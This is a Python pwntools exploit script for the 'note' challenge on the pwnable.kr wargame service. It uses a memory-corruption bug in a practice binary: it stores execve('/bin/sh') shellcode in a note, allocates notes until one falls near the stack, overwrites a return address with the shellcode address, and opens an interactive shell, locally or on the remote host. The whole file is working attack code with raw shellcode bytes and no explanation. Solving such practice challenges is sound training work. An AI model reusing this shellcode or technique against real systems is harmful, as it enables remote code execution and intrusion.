import os
from pwn import *
import argparse


context.log_level = 'info'


ADDR = 'pwnable.kr'
PORT = 9019

BIN_PATH = './note'
E = ELF(BIN_PATH)
STACK_BASE_ADDRESS = 0xffffd540
# STACK_BASE_ADDRESS = 0xffffdcc0


def create_note_near_stack(p):
    num_of_iterations = 0
    progress = log.progress('Number of iterations')
    while True:
        num_of_iterations += 1
        progress.status(str(num_of_iterations))
        p.recvuntil('5. exit')
        p.sendline('1')
        p.recvuntil(' [')
        note_addr = int(p.recvuntil(']', drop=True), base=16)
        if note_addr > 0xffe70000:
            p.success('')
            return note_addr
        else:
            p.recvuntil('5. exit')
            p.sendline('4')
            p.recvuntil('note no?\n')
            p.sendline('1')


def write_shellcode(p):
    p.recvuntil('5. exit')
    p.sendline('1')
    p.recvuntil(' [')
    shellcode_address = int(p.recvuntil(']', drop=True), base=16)
    p.recvuntil('5. exit')
    p.sendline('2')
    p.recvuntil('note no?\n')
    p.sendline('0')
    p.sendline('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
    return shellcode_address


def write_return_address(p, shellcode_address):
    p.recvuntil('5. exit')
    p.sendline('2')
    p.recvuntil('note no?\n')
    p.sendline('1')
    p.sendline(p32(shellcode_address) * 1024)


def return_from_function(p):
    p.recvuntil('5. exit')
    p.sendline('5')


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['local', 'remote'])

    return parser.parse_args()


def start_process():
    args = parse_args()
    p = None

    if args.mode == 'local':
        log.info('running locally...')
        p = process(BIN_PATH)
    elif args.mode == 'remote':
        log.info('pwning...')
        p = remote(ADDR, PORT)
    else:
        log.critical('invalid option')
        os.exit(1)
    return p


def main():
    p = start_process()

    shellcode_address = write_shellcode(p)
    log.info('shellcode address is 0x{:08x}'.format(shellcode_address))

    note_near_stack_address = create_note_near_stack(p)
    log.info('note near stack address is 0x{:08x}'.format(note_near_stack_address))

    log.info('now writing return address to stack...')
    write_return_address(p, shellcode_address)

    log.info('returning...')
    return_from_function(p)

    p.interactive()


if __name__ == '__main__':
    main()

